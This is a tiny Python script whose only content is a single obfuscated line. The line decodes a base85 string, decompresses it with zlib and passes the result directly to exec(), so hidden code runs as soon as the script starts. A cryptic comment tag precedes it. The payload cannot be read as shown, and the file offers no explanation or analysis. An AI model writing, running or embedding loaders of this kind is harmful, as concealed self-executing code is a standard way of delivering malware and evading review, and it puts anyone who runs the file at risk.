#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#bancetzLaut_
exec(__import__('zlib').decompress(__import__('base64').a85decode(b'Garo:9acP<&;KZQMSYJhLp;`XUX11T+!`D<:*?ncb`:U*rq@1"#bq&KL\\KgHVGJQF7#fo\'@]15c3m5OC!@^TZma3cE0m$IDE&3G@PN-DYptuOM8\'[]?CYD[Ba$o4L/C^!%ZZS5m(LZf)OS):#3\'a)P>Hu\\[8b8Ksh9K[C-kC=Z0CGbT%M#h4aU9PWdO=3\\I3rD&Bo2icc$9C<:J_i')))